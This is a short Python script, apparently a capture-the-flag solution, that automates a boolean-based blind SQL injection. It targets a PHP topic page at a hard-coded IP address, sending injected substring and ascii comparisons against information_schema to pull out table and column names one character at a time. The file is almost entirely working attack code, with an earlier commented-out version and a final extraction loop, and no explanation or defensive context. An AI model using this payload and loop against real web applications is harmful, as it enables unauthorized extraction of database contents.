# 31 and substring((select group_concat(table_name,0x3a,column_name) from information_schema.columns  WHERE table_schema = 'flag'),1,1)="w";


# import requests
# import time

# charset = [chr(i) for i in range(48, 59)] + [chr(i) for i in range(97, 123)]
# target = ""

# for idx in range(13):
#     for let in charset:
#         # time.sleep(3)
#         url = (
#             "http://20.214.183.146:1337/topic.php?id=31 and substring((select group_concat(table_name,0x3a,column_name) from information_schema.columns  WHERE table_schema = 'flag'),"
#             + str(idx + 1)
#             + ",1)="
#             + let
#             + ";"
#         )

#         print(url)

#         re = requests.get(url, cookies={"PHPSESSID": "dirjdc3aai9vsgl1k5574l7c55"})
#         # print(re.text)

#         if "find!!" in re.text:
#             target += let
#             print("target : {}".format(target))
#             break

#     # print("err" + str(idx))


import requests

target = ""

for idx in range(1, 30):
    for let in range(130):
        url = f"http://20.214.183.146:1337/topic.php?id=31 and ascii(substr((select group_concat(table_name,0x3a,column_name) from information_schema.columns  WHERE table_schema = 'flag'),{idx},1))={let}"

        re = requests.get(url, cookies={"PHPSESSID": "9kae89ochq9toee8vnd82goege"})

        if "find!!" in re.text:
            target += chr(let)
            print(target)
            break
